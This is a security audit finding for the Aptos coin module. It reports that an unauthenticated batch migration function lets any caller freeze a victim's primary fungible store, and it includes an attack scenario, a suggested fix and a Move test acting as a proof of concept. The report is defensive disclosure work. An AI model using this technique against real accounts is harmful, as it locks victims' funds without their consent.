# Audit Report

## Title
Unauthorized Coin-to-Fungible Asset Migration Enables Denial of Service via Forced Freeze

## Summary
The `migrate_coin_store_to_fungible_store` function lacks authorization checks, allowing any attacker to force migration of victim accounts' CoinStores to primary fungible stores. When a frozen CoinStore is migrated to an existing unfrozen primary fungible store, the migration forcibly freezes the entire primary store, locking all victim funds until the coin issuer intervenes.

## Finding Description
The coin module provides two migration functions: `migrate_to_fungible_store` (voluntary, requires signer) and `migrate_coin_store_to_fungible_store` (batch migration, no authorization). [1](#0-0) 

The voluntary migration properly validates permissions via `assert_signer_has_permission<CoinType>(account)`.

However, the batch migration function has no such checks: [2](#0-1) 

This function only checks feature flags—it does not validate that the caller has permission to migrate the target accounts.

The migration logic explicitly synchronizes the frozen state between CoinStore and primary fungible store: [3](#0-2) 

**Attack Scenario:**
1. Victim has a primary fungible store (unfrozen) with 1,000 APT
2. Victim has an old CoinStore (frozen by coin issuer for compliance) with 10 APT
3. Attacker calls `migrate_coin_store_to_fungible_store<AptosCoin>([victim_address])`
4. Migration deposits 10 APT into primary store and freezes it (line 693)
5. All 1,010 APT are now locked until coin issuer unfreezes the store

The frozen state is enforced by the fungible asset layer, preventing all withdrawals and deposits: [4](#0-3) 

Since `coin` is a friend of `fungible_asset`, it can call the internal freeze function without requiring a TransferRef.

## Impact Explanation
**High Severity** - This vulnerability enables:

1. **Denial of Service**: Attacker can lock victim funds indefinitely by forcing frozen state synchronization
2. **No Recovery Without Issuer**: Victims cannot self-unfreeze; they require intervention from the TransferRef holder (coin issuer)
3. **Mass Griefing**: Attacker can submit multiple transactions targeting numerous victims
4. **Event History Loss**: Migration destroys event handles, breaking off-chain indexers

This qualifies as **High Severity** per Aptos bounty criteria due to significant protocol violation enabling temporary funds freezing, or **Medium Severity** for limited funds manipulation requiring intervention.

## Likelihood Explanation
**High Likelihood** when:
- Feature flags `new_accounts_default_to_fa_store_enabled` or `new_accounts_default_to_fa_apt_store_enabled` are active (expected on mainnet during migration period)
- Users maintain both frozen CoinStores (legacy accounts, compliance freezes) and active primary fungible stores (common during transition)
- No special privileges required—any account can execute the attack
- Gas costs are low relative to impact (single transaction can affect user funds)

## Recommendation
Add authorization checks to `migrate_coin_store_to_fungible_store` similar to the voluntary migration:

```move
public entry fun migrate_coin_store_to_fungible_store<CoinType>(
    caller: &signer,  // Add signer parameter
    accounts: vector<address>
) acquires CoinStore, CoinConversionMap, CoinInfo {
    if (features::new_accounts_default_to_fa_store_enabled()
        || features::new_accounts_default_to_fa_apt_store_enabled()) {
        // Add authorization: only system addresses can batch migrate
        system_addresses::assert_aptos_framework(caller);
        
        std::vector::for_each(
            accounts,
            |account| {
                maybe_convert_to_fungible_store<CoinType>(account);
            }
        );
    }
}
```

Alternative: Remove the batch migration function entirely and require users to voluntarily migrate via `migrate_to_fungible_store`.

## Proof of Concept

```move
#[test(victim = @0x123, attacker = @0x456, framework = @aptos_framework)]
fun test_unauthorized_freeze_via_migration(
    victim: &signer,
    attacker: &signer,
    framework: &signer
) {
    use aptos_framework::coin;
    use aptos_framework::primary_fungible_store;
    use aptos_framework::fungible_asset;
    
    // Setup: Initialize APT coin
    let (burn_cap, freeze_cap, mint_cap) = coin::initialize<AptosCoin>(
        framework, 
        string::utf8(b"Aptos Coin"), 
        string::utf8(b"APT"),
        8,
        true
    );
    
    let victim_addr = signer::address_of(victim);
    
    // Victim has frozen CoinStore with 10 APT
    coin::register<AptosCoin>(victim);
    coin::deposit(victim_addr, coin::mint(10, &mint_cap));
    coin::freeze_coin_store(victim_addr, &freeze_cap);
    
    // Victim separately creates unfrozen primary fungible store with 1000 APT
    let metadata = coin::ensure_paired_metadata<AptosCoin>();
    primary_fungible_store::deposit(victim_addr, coin::mint(1000, &mint_cap));
    
    // Verify primary store is unfrozen
    let store = primary_fungible_store::primary_store(victim_addr, metadata);
    assert!(!fungible_asset::is_frozen(store), 0);
    
    // ATTACK: Attacker forces migration without victim consent
    coin::migrate_coin_store_to_fungible_store<AptosCoin>(vector[victim_addr]);
    
    // RESULT: Primary store is now frozen, locking ALL 1010 APT
    assert!(fungible_asset::is_frozen(store), 1);
    
    // Victim cannot withdraw funds
    primary_fungible_store::withdraw(victim, metadata, 1); // Will abort with ESTORE_IS_FROZEN
}
```

**Notes:**
- The vulnerability exists in the production code path when feature flags are enabled
- MigrationFlag struct itself is benign (deprecated marker resource) but the migration function is exploitable
- Attack requires no special privileges and can target any account
- Impact is amplified during the transition period when both CoinStore and primary fungible stores coexist

### Citations

**File:** aptos-move/framework/aptos-framework/sources/coin.move (L687-694)
```text
                // Note:
                // It is possible the primary fungible store may already exist before this function call.
                // In this case, if the account owns a frozen CoinStore and an unfrozen primary fungible store, this
                // function would convert and deposit the rest coin into the primary store and freeze it to make the
                // `frozen` semantic as consistent as possible.
                if (frozen != fungible_asset::is_frozen(store)) {
                    fungible_asset::set_frozen_flag_internal(store, frozen);
                }
```

**File:** aptos-move/framework/aptos-framework/sources/coin.move (L717-723)
```text
    public entry fun migrate_to_fungible_store<CoinType>(
        account: &signer
    ) acquires CoinStore, CoinConversionMap, CoinInfo {
        let account_addr = signer::address_of(account);
        assert_signer_has_permission<CoinType>(account);
        maybe_convert_to_fungible_store<CoinType>(account_addr);
    }
```

**File:** aptos-move/framework/aptos-framework/sources/coin.move (L726-738)
```text
    public entry fun migrate_coin_store_to_fungible_store<CoinType>(
        accounts: vector<address>
    ) acquires CoinStore, CoinConversionMap, CoinInfo {
        if (features::new_accounts_default_to_fa_store_enabled()
            || features::new_accounts_default_to_fa_apt_store_enabled()) {
            std::vector::for_each(
                accounts,
                |account| {
                    maybe_convert_to_fungible_store<CoinType>(account);
                }
            );
        }
    }
```

**File:** aptos-move/framework/aptos-framework/sources/fungible_asset.move (L18-19)
```text
    friend aptos_framework::coin;
    friend aptos_framework::primary_fungible_store;
```
